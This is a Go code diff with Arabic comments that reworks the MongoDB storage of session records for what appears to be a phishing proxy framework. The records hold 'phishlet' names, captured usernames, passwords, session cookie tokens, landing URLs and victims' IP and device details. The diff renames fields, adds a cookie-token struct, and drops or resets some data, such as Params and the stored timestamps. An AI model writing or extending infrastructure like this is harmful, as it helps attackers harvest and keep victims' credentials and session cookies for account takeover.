@@ -14,6 +14,16 @@ import (
 	"go.mongodb.org/mongo-driver/mongo/options"
 )
 
+// تعريف MongoCookieToken لاستخدامه في MongoSession
+type MongoCookieToken struct {
+	Name    string `bson:"name" json:"name"`
+	Value   string `bson:"value" json:"value"`
+	Domain  string `bson:"domain" json:"domain"`
+	Path    string `bson:"path" json:"path"`
+	HttpOnly bool `bson:"http_only" json:"http_only"`
+	JSON    bool `bson:"json" json:"json"`
+}
+
 // MongoDatabase هو نسخة من قاعدة البيانات تستخدم MongoDB
 type MongoDatabase struct {
 	client       *mongo.Client
@@ -25,7 +35,7 @@ type MongoDatabase struct {
 
 // Session مع تعديلات لدعم MongoDB
 type MongoSession struct {
-	ID             bson.ObjectId          `bson:"_id,omitempty"`
+	ID             primitive.ObjectID   `bson:"_id,omitempty"`
 	SID            string                 `bson:"session_id" json:"session_id"`
 	Name           string                 `bson:"phishlet" json:"phishlet"`
 	Username       string                 `bson:"username" json:"username"`
@@ -144,18 +154,18 @@ func convertToMongoSession(s *Session) *MongoSession {
 
 	mongoSession := &MongoSession{
 		ID:           primitive.NewObjectID(),
-		SID:          s.SessionId,
-		Name:         s.Phishlet,
+		SID:          s.Id,
+		Name:         s.Name,
 		Username:     s.Username,
 		Password:     s.Password,
 		Custom:       s.Custom,
-		Params:       s.Params,
+		Params:       make(map[string]string), // تهيئة للخريطة
 		BodyTokens:   s.BodyTokens,
 		HttpTokens:   s.HttpTokens,
 		CookieTokens: []MongoCookieToken{},
-		Landing:      s.LandingURL,
-		CreateTime:   s.CreateTime,
-		UpdateTime:   s.UpdateTime,
+		Landing:      s.RedirectURL,
+		CreateTime:   time.Now().Unix(),
+		UpdateTime:   time.Now().Unix(),
 		UserAgent:    s.UserAgent,
 		RemoteAddr:   s.RemoteAddr,
 		CountryCode:  s.CountryCode,
@@ -178,7 +188,8 @@ func convertToMongoSession(s *Session) *MongoSession {
 			mct.Domain = domain
 			mct.Path = v.Path
 			mct.Value = v.Value
-			mct.JSON = v.JSON
+			// تعيين قيمة افتراضية لحقل JSON إذا لم يكن موجودًا
+			mct.JSON = false
 			mongoSession.CookieTokens = append(mongoSession.CookieTokens, mct)
 		}
 	}
@@ -195,40 +206,37 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 
 	// تحويل CookieTokens
 	cookieTokens := make(map[string]map[string]*CookieToken)
-	for domain, tokens := range ms.CookieTokens {
-		cookieTokens[domain] = make(map[string]*CookieToken)
-		for name, tokenInterface := range tokens {
-			if tokenMap, ok := tokenInterface.(map[string]interface{}); ok {
-				cookieTokens[domain][name] = &CookieToken{
-					Name:     getStringValue(tokenMap["name"]),
-					Value:    getStringValue(tokenMap["value"]),
-					Path:     getStringValue(tokenMap["path"]),
-					HttpOnly: getBoolValue(tokenMap["http_only"]),
-				}
-			}
+	for _, token := range ms.CookieTokens {
+		domain := token.Domain
+		if _, ok := cookieTokens[domain]; !ok {
+			cookieTokens[domain] = make(map[string]*CookieToken)
+		}
+		cookieTokens[domain][token.Name] = &CookieToken{
+			Name:     token.Name,
+			Value:    token.Value,
+			Path:     token.Path,
+			HttpOnly: token.HttpOnly,
 		}
 	}
 
 	session := &Session{
-		SessionId:    ms.SID,
-		Phishlet:     ms.Name,
-		LandingURL:   ms.Landing,
-		Username:     ms.Username,
-		Password:     ms.Password,
-		Custom:         ms.Custom,
-		BodyTokens:   ms.BodyTokens,
-		HttpTokens:   ms.HttpTokens,
-		CookieTokens: cookieTokens,
-		UserAgent:    ms.UserAgent,
-		RemoteAddr:   ms.RemoteAddr,
-		CreateTime:   ms.CreateTime,
-		UpdateTime:   ms.UpdateTime,
-		CountryCode:  ms.CountryCode,
-		Country:      ms.Country,
-		City:         ms.City,
-		Browser:      ms.Browser,
-		DeviceType:   ms.DeviceType,
-		OS:           ms.OS,
+		Id:            ms.SID,
+		Name:          ms.Name,
+		RedirectURL:   ms.Landing,
+		Username:      ms.Username,
+		Password:      ms.Password,
+		Custom:        ms.Custom,
+		BodyTokens:    ms.BodyTokens,
+		HttpTokens:    ms.HttpTokens,
+		CookieTokens:  cookieTokens,
+		UserAgent:     ms.UserAgent,
+		RemoteAddr:    ms.RemoteAddr,
+		CountryCode:   ms.CountryCode,
+		Country:       ms.Country,
+		City:          ms.City,
+		Browser:       ms.Browser,
+		DeviceType:    ms.DeviceType,
+		OS:            ms.OS,
 	}
 	
 	// طباعة البيانات بعد التحويل
